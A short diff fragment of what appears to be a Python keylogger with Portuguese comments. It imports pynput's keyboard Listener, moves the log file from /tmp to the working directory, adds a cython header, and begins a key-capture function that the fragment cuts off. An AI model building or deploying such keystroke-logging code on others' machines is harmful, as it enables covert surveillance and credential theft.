@@ -1,12 +1,12 @@
+#!python
+#cython: language_level=3
 #importando o modulo pynput
 from pynput.keyboard import Listener
 #importando o modulo para expressão regular
 import re
 
 # setando caminho do arquivo
-arquivolog = "/tmp/key.log"
-
-
+arquivolog = "key.log"
 
 #  tratando e salvando valor em arquivo
 def capturar(tecla):
